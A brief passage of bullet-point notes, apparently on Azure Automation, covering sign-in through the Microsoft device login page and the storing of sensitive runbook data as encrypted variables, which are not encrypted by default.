  - After browsing to the [devicelogin](https://microsoft.com/devicelogin) page and entering the code, we can sign in as a user and get a session in this context in the terminal.
- Sensitive data that you want to make available to your runbooks should be saved as encrypted variables. 
  - It's worth noting that variables are not set to be encrypted by default. 
  - After creating an encrypted variable, you can't change its encryption status without re-creating the variable.